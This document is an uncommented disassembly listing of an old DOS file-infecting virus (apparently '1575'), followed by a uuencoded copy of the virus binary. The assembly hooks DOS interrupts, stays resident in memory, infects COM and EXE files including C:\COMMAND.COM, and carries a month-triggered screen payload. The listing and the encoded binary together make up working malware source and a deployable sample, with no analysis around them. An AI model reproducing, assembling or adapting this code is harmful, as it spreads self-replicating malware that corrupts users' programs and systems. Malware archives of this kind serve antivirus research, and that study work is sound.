PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 COMMAND                      ;;
;;;                                      ;;
;;;      Created:   1-Jul-92                             ;;
;;;      Passes:    5          Analysis Options on: AW               ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

data_1e     equ 6
data_2e     equ 84h
data_3e     equ 86h
data_9e     equ 31Fh
data_11e    equ 0
data_12e    equ 3
data_13e    equ 12h
data_53e    equ 6B0h
data_54e    equ 725h
data_55e    equ 0
data_56e    equ 0FA0h
data_57e    equ 0

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

command     proc    far

start:
        push    cs
        mov ax,cs
        add ax,1
        push    ax
        mov ax,100h
        push    ax
        retf                ; Return far
        mov [di],bl
        mov [di],bl
        jmp short loc_3
        nop
        dec dx
        add ax,2460h
        push    bx
        inc word ptr [bx+si]
           lock jmp $+0D30h
        mov dx,0ADAh
        cmp ax,5
        je  loc_1           ; Jump if equal
        mov dx,0FFFFh
        push    ss
        add [bx+si],ax
        add bp,si
        xchg    ax,si
        add [bx+di],al
        push    ss
        add [bp+0],ax
        nop             ; ASM fixup - displacement
        nop             ; ASM fixup - sign extn byte
        add [bx+si],al
        add [bx+si+14h],ah
        add ax,1600h
        db   63h, 29h, 98h
loc_1:
        xchg    al,[bx+si]
        out 0Bh,ax          ; port 0Bh, DMA-1 mode reg
        retf    0B005h          ; Return far
        add al,56h          ; 'V'
        add [bx],ax
        mov dl,[bx+si]
        sub [bx+di],ax
        hlt             ; Halt processor
        push    es
        jo  loc_2           ; Jump if overflow=1
loc_2:
        or  [bx+si],al
        mov sp,0F402h
        push    es
        jo  loc_3           ; Jump if overflow=1
loc_3:
        push    es
        push    ds
        mov ax,es
        push    cs
        pop ds
        push    cs
        pop es
        mov word ptr ds:[135h],ax
        mov ax,ss
        mov word ptr ds:[12Bh],ax
        mov al,2
        out 20h,al          ; port 20h, 8259-1 int command
        cld             ; Clear direction
        xor ax,ax           ; Zero register
        mov ds,ax
        xor si,si           ; Zero register
        mov di,13Ch
        mov cx,10h
        repne   movsb           ; Rep zf=0+cx >0 Mov [si] to es:[di]
        push    ds
        pop ss
        mov bp,8
        xchg    bp,sp
        call    sub_1
        jmp loc_26
loc_4:
        call    sub_12
        call    sub_2
        jz  loc_5           ; Jump if zero
        mov al,byte ptr ds:[724h]
        push    ax
        call    sub_3
        pop ax
        mov byte ptr ds:[724h],al
        jmp short loc_6
        nop
loc_5:
        call    sub_5
        call    sub_6
        cmp byte ptr ds:[724h],0
        jne loc_6           ; Jump if not equal
        mov ax,4C00h
        int 21h         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
loc_6:
        cmp byte ptr ds:[724h],43h  ; 'C'
        jne loc_9           ; Jump if not equal
loc_7:
        pop ds
        pop es
        push    cs
        pop ds
        pop es
        push    es
        mov di,100h
        mov si,10Bh
        mov cx,0Ch
        repne   movsb           ; Rep zf=0+cx >0 Mov [si] to es:[di]
        push    es
        pop ds
        mov ax,100h
        push    ax
        xor ax,ax           ; Zero register
        retf                ; Return far

command     endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        mov si,data_1e
        lodsw               ; String [si] to ax
        cmp ax,192h
        je  loc_7           ; Jump if equal
        cmp ax,179h
        jne loc_8           ; Jump if not equal
        jmp loc_11
loc_8:
        cmp ax,1DCh
        je  loc_9           ; Jump if equal
        retn
loc_9:
        pop ds
        pop es
        mov bx,word ptr cs:[119h]
        sub bx,word ptr cs:[131h]
        mov ax,cs
        sub ax,bx
        mov ss,ax
        mov bp,word ptr cs:[133h]
        xchg    bp,sp
        mov bx,word ptr cs:[121h]
        sub bx,word ptr cs:[123h]
        mov ax,cs
        sub ax,bx
        push    ax
        mov ax,word ptr cs:[125h]
        push    ax
        retf                ; Return far
        and bx,[bp+si]
        cmp al,23h          ; '#'
        das             ; Decimal adjust
        sub ax,212Dh
        db   2Eh, 24h, 0Eh, 23h, 2Fh, 2Dh
        db  0E0h
        db  'C:\COMMAND.COM'
        db   00h, 24h, 24h, 24h, 24h, 24h

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2:
        mov ax,3D02h
        mov dx,219h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_10          ; Jump if carry=0
        clc             ; Clear carry flag
        retn
loc_10:
        mov word ptr ds:[12Bh],ax
        mov dx,offset int_24h_entry
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        mov ax,4202h
        mov bx,word ptr ds:[12Bh]
        mov cx,0FFFFh
        mov dx,0FFFEh
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        mov dx,27Dh
        mov ah,3Fh          ; '?'
        mov bx,word ptr ds:[12Bh]
        mov cx,2
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, bx=file handle
                        ;   cx=bytes to ds:dx buffer
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        push    ds
        mov dx,word ptr ds:[139h]
        mov ax,word ptr ds:[137h]
        mov ds,ax
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        pop ds
        cmp word ptr ds:[27Dh],0A0Ch
        clc             ; Clear carry flag
        retn
        add [bx+si],al
loc_11:
        cmp ax,22Dh
        je  loc_12          ; Jump if equal
        push    ds
        pop es
        push    cs
        pop ds
        mov ax,word ptr ds:[12Bh]
        mov ss,ax
        xchg    bp,sp
        mov si,13Ch
        mov di,data_11e
        mov cx,10h
        cld             ; Clear direction
        repne   movsb           ; Rep zf=0+cx >0 Mov [si] to es:[di]
        jmp loc_4
sub_1       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
loc_12:
        mov al,43h          ; 'C'
        mov byte ptr ds:[724h],al
        mov al,8
        out 70h,al          ; port 70h, RTC addr/enabl NMI
                        ;  al = 8, month register
        in  al,71h          ; port 71h, RTC clock/RAM data
        mov byte ptr ds:[13Bh],al
        mov dx,219h
        mov ax,3D02h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_13          ; Jump if carry=0
        retn
loc_13:
        mov word ptr ds:[12Bh],ax
        mov dx,10Bh
        mov bx,word ptr ds:[12Bh]
        mov cx,0Ch
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, bx=file handle
                        ;   cx=bytes to ds:dx buffer
        mov ax,4202h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        push    ax
        add ax,10h
        and ax,0FFF0h
        push    ax
        shr ax,1            ; Shift w/zeros fill
        shr ax,1            ; Shift w/zeros fill
        shr ax,1            ; Shift w/zeros fill
        shr ax,1            ; Shift w/zeros fill
        mov di,data_9e
        stosw               ; Store ax to es:[di]
        pop ax
        pop bx
        sub ax,bx
        mov cx,627h
        add cx,ax
        mov dx,100h
        sub dx,ax
        mov bx,word ptr ds:[12Bh]
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov ax,4200h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        mov ah,40h          ; '@'
        mov bx,word ptr ds:[12Bh]
        mov cx,0Ch
        mov dx,31Bh
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov ah,3Eh          ; '>'
        mov bx,word ptr ds:[12Bh]
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        retn
sub_3       endp

        push    cs
        mov ax,cs
        add ax,1
        push    ax
        mov ax,100h
        push    ax
        retf                ; Return far

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4       proc    near
        mov al,45h          ; 'E'
        mov byte ptr ds:[724h],al
        mov al,8
        out 70h,al          ; port 70h, RTC addr/enabl NMI
                        ;  al = 8, month register
        in  al,71h          ; port 71h, RTC clock/RAM data
        mov byte ptr ds:[13Bh],al
        mov dx,219h
        mov ax,3D02h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_14          ; Jump if carry=0
        retn
loc_14:
        mov word ptr ds:[12Bh],ax
        mov dx,10Bh
        mov bx,word ptr ds:[12Bh]
        mov cx,18h
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, bx=file handle
                        ;   cx=bytes to ds:dx buffer
        mov ax,4202h
        mov cx,0
        mov dx,0
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        push    ax
        add ax,10h
        adc dx,0
        and ax,0FFF0h
        mov word ptr ds:[127h],dx
        mov word ptr ds:[129h],ax
        mov cx,727h
        sub cx,100h
        add ax,cx
        adc dx,0
        mov cx,200h
        div cx          ; ax,dx rem=dx:ax/reg
        inc ax
        mov word ptr ds:[10Fh],ax
        mov word ptr ds:[10Dh],dx
        mov ax,word ptr ds:[121h]
        mov word ptr ds:[123h],ax
        mov ax,word ptr ds:[11Fh]
        mov word ptr ds:[125h],ax
        mov ax,word ptr ds:[119h]
        mov word ptr ds:[131h],ax
        mov ax,word ptr ds:[11Bh]
        mov word ptr ds:[133h],ax
        mov dx,word ptr ds:[127h]
        mov ax,word ptr ds:[129h]
        mov cx,10h
        div cx          ; ax,dx rem=dx:ax/reg
        sub ax,10h
        sub ax,word ptr ds:[113h]
        mov word ptr ds:[121h],ax
        mov word ptr ds:[119h],ax
        mov word ptr ds:[11Fh],100h
        mov word ptr ds:[11Bh],100h
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,2
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        mov dx,10Dh
        mov bx,word ptr ds:[12Bh]
        mov cx,16h
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov ax,4202h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        mov dx,100h
        mov ax,word ptr ds:[129h]
        pop cx
        sub ax,cx
        sub dx,ax
        mov cx,727h
        add cx,ax
        sub cx,100h
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        retn
sub_4       endp

        push    cx
        mov cx,0
        mov ah,4Eh          ; 'N'
        int 21h         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        pop cx
        retn

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_5       proc    near
        push    es
        mov ax,351Ch
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        mov word ptr cs:[107h],bx
        mov word ptr cs:[109h],es
        mov ax,3521h
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        push    es
        pop ax
        mov word ptr cs:[105h],ax
        mov word ptr cs:[103h],bx
        pop es
        retn
sub_5       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_6       proc    near
        push    ax
        push    es
        push    ds
        xor ax,ax           ; Zero register
        mov es,ax
        mov si,data_3e
        mov ax,es:[si]
        mov ds,ax
        mov si,data_54e
        cmp word ptr [si],0A0Ch
        jne loc_15          ; Jump if not equal
        push    ds
        pop ax
        call    sub_13
        pop ds
        pop es
        pop ax
        retn
loc_15:
        push    cs
        pop ds
        mov ax,word ptr ds:[135h]
        dec ax
        mov es,ax
        cmp byte ptr es:data_57e,5Ah    ; 'Z'
        nop             ; ASM fixup - sign extn byte
        je  loc_16          ; Jump if equal
        jmp short loc_17
        nop
loc_16:
        mov ax,es:data_12e
        mov cx,737h
        shr cx,1            ; Shift w/zeros fill
        shr cx,1            ; Shift w/zeros fill
        shr cx,1            ; Shift w/zeros fill
        shr cx,1            ; Shift w/zeros fill
        sub ax,cx
        jc  loc_17          ; Jump if carry Set
        mov es:data_12e,ax
        sub es:data_13e,cx
        push    cs
        pop ds
        mov ax,es:data_13e
        push    ax
        pop es
        mov si,100h
        push    si
        pop di
        mov cx,627h
        cld             ; Clear direction
        repne   movsb           ; Rep zf=0+cx >0 Mov [si] to es:[di]
        push    es
        sub ax,ax
        mov es,ax
        mov si,data_2e
        mov dx,4A8h
        mov es:[si],dx
        inc si
        inc si
        pop ax
        mov es:[si],ax
loc_17:
        pop ds
        pop es
        pop ax
        retn
sub_6       endp

        cmp al,57h          ; 'W'
        jne loc_18          ; Jump if not equal
        jmp short loc_21
        nop
loc_18:
        cmp ah,1Ah
        jne loc_19          ; Jump if not equal
;*      call    sub_11
        db  0E8h, 17h, 01h
        jmp short loc_21
        nop
loc_19:
        cmp ah,11h
        jne loc_20          ; Jump if not equal
        call    sub_7
        iret                ; Interrupt return
loc_20:
        cmp ah,12h
        jne loc_21          ; Jump if not equal
        call    sub_10
        iret                ; Interrupt return
loc_21:
        jmp dword ptr cs:[103h]

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_7       proc    near
        mov al,57h          ; 'W'
        int 21h         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
        push    ax
        push    cx
        push    dx
        push    bx
        push    bp
        push    si
        push    di
        push    ds
        push    es
        push    cs
        pop ds
        push    cs
        pop es
        mov byte ptr cs:[5CDh],0
        nop
        call    sub_8
        jnz loc_22          ; Jump if not zero
        call    sub_2
        jz  loc_22          ; Jump if zero
        call    sub_15
        dec byte ptr ds:[5CDh]
loc_22:
        pop es
        pop ds
        pop di
        pop si
        pop bp
        pop bx
        pop dx
        pop cx
        pop ax
        retn
sub_7       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_8       proc    near
        push    cs
        pop es
        push    cs
        pop es
        cld             ; Clear direction
        call    sub_9
        jnc loc_23          ; Jump if carry=0
        cmp di,0
        retn
loc_23:
        mov di,219h
        mov al,2Eh          ; '.'
        mov cx,0Bh
        repne   scasb           ; Rep zf=0+cx >0 Scan es:[di] for al
        cmp word ptr [di],4F43h
        jne loc_24          ; Jump if not equal
        cmp byte ptr [di+2],4Dh ; 'M'
        jne loc_24          ; Jump if not equal
        mov byte ptr ds:[724h],43h  ; 'C'
        nop
        retn
loc_24:
        cmp word ptr [di],5845h
        jne loc_ret_25      ; Jump if not equal
        cmp byte ptr [di+2],45h ; 'E'
        jne loc_ret_25      ; Jump if not equal
        mov byte ptr ds:[724h],45h  ; 'E'
        nop

loc_ret_25:
        retn
sub_8       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_9       proc    near
loc_26:
        push    ds
        mov si,word ptr cs:[12Dh]
        mov ax,word ptr cs:[12Fh]
        mov ds,ax
        mov di,219h
        lodsb               ; String [si] to al
        cmp al,0FFh
        jne loc_27          ; Jump if not equal
        add si,6
        lodsb               ; String [si] to al
        jmp short loc_28
        nop
loc_27:
        cmp al,5
        jb  loc_28          ; Jump if below
        pop ds
        stc             ; Set carry flag
        retn
loc_28:
        mov cx,0Bh
        cmp al,0
        je  locloop_29      ; Jump if equal
        add al,40h          ; '@'
        stosb               ; Store al to es:[di]
        mov al,3Ah          ; ':'
        stosb               ; Store al to es:[di]

locloop_29:
        lodsb               ; String [si] to al
        cmp al,20h          ; ' '
        je  loc_30          ; Jump if equal
        stosb               ; Store al to es:[di]
        jmp short loc_31
        nop
loc_30:
        cmp byte ptr es:[di-1],2Eh  ; '.'
        je  loc_31          ; Jump if equal
        mov al,2Eh          ; '.'
        stosb               ; Store al to es:[di]
loc_31:
        loop    locloop_29      ; Loop if cx > 0

        mov al,0
        stosb               ; Store al to es:[di]
        pop ds
        clc             ; Clear carry flag
        retn
sub_9       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_10      proc    near
        mov al,57h          ; 'W'
        int 21h         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
        push    ax
        push    cx
        push    dx
        push    bx
        push    bp
        push    si
        push    di
        push    ds
        push    es
        push    cs
        pop ds
        push    cs
        pop es
        cmp byte ptr cs:[5CDh],0
        je  loc_32          ; Jump if equal
        jmp short loc_33
        nop
loc_32:
        call    sub_8
        jnz loc_33          ; Jump if not zero
        call    sub_2
        jz  loc_33          ; Jump if zero
        call    sub_15
        dec byte ptr ds:[5CDh]
        pop es
        pop ds
        pop di
        pop si
        pop bp
        pop bx
        pop dx
        pop cx
        pop ax
        retn
loc_33:
        pop es
        pop ds
        pop di
        pop si
        pop bp
        pop bx
        pop dx
        pop cx
        pop ax
        retn
sub_10      endp

        add [bx+si+1Eh],dl
        pop ax
        mov word ptr cs:[12Fh],ax
        mov word ptr cs:[12Dh],dx
        pop ax
        retn

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_12      proc    near
        push    cs
        mov al,0
        out 20h,al          ; port 20h, 8259-1 int command
        mov ax,3524h
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        mov word ptr ds:[139h],bx
        mov bx,es
        mov word ptr ds:[137h],bx
        pop es
        mov si,20Ah
        mov di,219h
        mov cx,0Fh

locloop_34:
        lodsb               ; String [si] to al
        add al,20h          ; ' '
        stosb               ; Store al to es:[di]
        loop    locloop_34      ; Loop if cx > 0

        retn
sub_12      endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_13      proc    near
        push    ax
        push    cs
        pop ds
        push    cs
        pop es
        mov bl,byte ptr ds:[13Bh]
        cmp bl,0Ch
        ja  loc_36          ; Jump if above
        cmp bl,0
        je  loc_36          ; Jump if equal
        mov al,8
        out 70h,al          ; port 70h, RTC addr/enabl NMI
                        ;  al = 8, month register
        in  al,71h          ; port 71h, RTC clock/RAM data
        cmp al,0Ch
        ja  loc_36          ; Jump if above
        cmp al,0
        je  loc_36          ; Jump if equal
        cmp al,bl
        je  loc_36          ; Jump if equal
        inc bl
        call    sub_14
        cmp al,bl
        je  loc_36          ; Jump if equal
        inc bl
        call    sub_14
        cmp al,bl
        je  loc_36          ; Jump if equal
        pop ds
        call    sub_16
        push    cs
        pop ds
        retn

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_14:
        cmp bl,0Ch
        jbe loc_ret_35      ; Jump if below or =
        sub bl,0Ch

loc_ret_35:
        retn
loc_36:
        pop ax
        retn
sub_13      endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_15      proc    near
        mov dx,offset int_24h_entry
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        cmp byte ptr ds:[724h],43h  ; 'C'
        jne loc_37          ; Jump if not equal
        call    sub_3
        jmp short loc_38
        nop
loc_37:
        call    sub_4
loc_38:
        push    ds
sub_15      endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;           External Entry Point
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

int_24h_entry   proc    far
        mov dx,word ptr ds:[139h]
        mov ax,word ptr ds:[137h]
        mov ds,ax
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        pop ds
        retn
int_24h_entry   endp

        mov al,3
        iret                ; Interrupt return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_16      proc    near
;*      mov dx,offset loc_46
        db  0BAh,0B0h, 06h
        mov ax,251Ch
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        mov byte ptr ds:data_53e,90h
        nop
        mov ax,0B800h
        mov es,ax
        mov di,data_56e
        mov ax,720h
        mov cx,0Bh
        repne   stosw           ; Rep zf=0+cx >0 Store ax to es:[di]
        push    cs
        pop es
        retn
sub_16      endp

        add [bx+si],al
        add [bx+si],ah
        pop es
;*      pop cs          ; Dangerous 8088 only
        db  0Fh
        or  cl,[bx]
        or  cl,[bx]
        or  cl,[bx]
        or  cl,[bx]
        or  cl,[bx]
        or  cl,[bx]
        or  cl,[bx]
        or  dh,bh
        push    cs
        out dx,al           ; port 0, DMA-1 bas&add ch 0
        or  al,90h
        sti             ; Enable interrupts
        push    ax
        push    cx
        push    dx
        push    bx
        push    bp
        push    si
        push    di
        push    ds
        push    es
        push    cs
        pop ds
        jmp short loc_40
        nop
loc_39:
        pop es
        pop ds
        pop di
        pop si
        pop bp
        pop bx
        pop dx
        pop cx
        pop ax
        iret                ; Interrupt return
loc_40:
        mov ax,0B800h
        mov es,ax
        call    sub_17
        mov si,69Ah
        mov cx,16h
        repne   movsb           ; Rep zf=0+cx >0 Mov [si] to es:[di]
        cmp byte ptr ds:[6AEh],0EEh
        je  loc_41          ; Jump if equal
        mov byte ptr ds:[6AEh],0EEh
        jmp short loc_42
        nop
loc_41:
        mov byte ptr ds:[6AEh],0F0h
loc_42:
        mov ax,es:[di]
        mov ah,0Eh
        mov word ptr ds:[69Ah],ax
        mov byte ptr ds:[699h],0
        jmp short loc_39

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_17      proc    near
        mov di,data_55e
loc_43:
        mov si,69Ch
        push    di
        mov cx,12h
        cld             ; Clear direction
        repe    cmpsb           ; Rep zf=1+cx >0 Cmp [si] to es:[di]
        pop di
        jz  loc_44          ; Jump if zero
        inc di
        inc di
        cmp di,0FA0h
        jne loc_43          ; Jump if not equal
        mov di,0
loc_44:
        cmp di,0F9Eh
        jne loc_ret_45      ; Jump if not equal
        mov byte ptr ds:[6B0h],0CFh

loc_ret_45:
        retn
sub_17      endp

        inc bx
        or  al,0Ah

seg_a       ends



        end start
begin 775 1575-org.com
M#HS(!0$`4+@``5#+B!V('>M+D$H%8"13_P#PZ2T-NMH*/04`=!RZ__\6`0`#
M[I8``18!1@"0D````&`4!0`68RF8A@#G"\H%L`16`0>*$"D!]`9P``@`O`+T
M!G``!AZ,P`X?#@>C-0&,T*,K`;`"YB#\,\".V#/VOSP!N1``\J0>%[T(`(?L
MZ$P`Z<<#Z%X$Z*L`=`Z@)`=0Z!,!6*(D!^L3D.AV`NB5`H`^)`<`=06X`$S-
M(8`^)`=#=3$?!PX?!P:_``&^"P&Y#`#RI`8?N``!4#/`R[X&`*T]D@%TW3UY
M`74#Z:D`/=P!=`'#'P
M(P&,R"O#4"ZA)0%0RR,:/",O+2TA+B0.(R\MX$,Z7$-/34U!3D0N0T]-`"0D
M)"0DN`(]NAD"S2%S`OC#HRL!NG4&N"0ES2&X`D*+'BL!N?__NO[_S2&Z?0*T
M/XL>*P&Y`@#-(;0^S2$>BQ8Y`:$W`8[8N"0ES2$?@3Y]`@P*^,,``#TM`G0:
M'@<.'Z$K`8[0A^R^/`&_``"Y$`#\\J3IWOZP0Z(D![`(YG#D<:([`;H9`K@"
M/C1
MZ-'HOQ\#JUA;*\.Y)P8#R+H``2O0BQXK`;1`S2&X`$(SR3/2S2&T0(L>*P&Y
M#`"Z&P/-(;0^BQXK`<.1QHCL!NAD"
MN`(]S2%S`<.C*P&Z"P&+'BL!N1@`M#_-(;@"0KD``+H``,TA4`40`(/2`"7P
M_XD6)P&C*0&Y)P>!Z0`!`\&#T@"Y``+W\4"C#P&)%@T!H2$!HR,!H1\!HR4!
MH1D!HS$!H1L!HS,!BQ8G`:$I`;D0`/?Q+1``*P83`:,A`:,9`<<&'P$``<<&
M&P$``;@`0C/)N@(`S2&Z#0&+'BL!N18`M$#-(;@"0C/),]+-(;H``:$I`5DK
MP2O0N2<'`\B!Z0`!M$#-(;0^S2'#4;D``+1.S2%9PP:X'#7-(2Z)'@!/`P*=0D>
M6.BX`1\'6,,.'Z$U`4B.P":`/@``6I!T`^M$D":A`P"Y-P?1Z='IT>G1Z2O!
M<&_/*D!BO`CL"^A`"ZJ`0FB11&
M1E@FB00?!UC#/%=U`^L>D(#\&G4&Z!!@X?#@^"@*_&0*Y#P"L!""JXOK#4`X?#@>*
M'CL!@/L,=SF`^P!T-+`(YG#D<3P,=RH\`'0F.L-T(O[#Z!0`.L-T&?[#Z`L`
M.L-T$!_H.@`.'\.`^PQV`X#K#,-8P[IU!K@D)75M:65C/N`"XCL#H*P"^F@:Y%@#RI(`^K@;N=`C&!JX&[NL&
MD,8&K@;P)HL%M`ZCF@;&!ID&`.O#OP``OIP&5[D2`/SSIE]T"T='@?^@#W7K
2OP``@?^>#W4%Q@:P!L_#0PP*
`
end
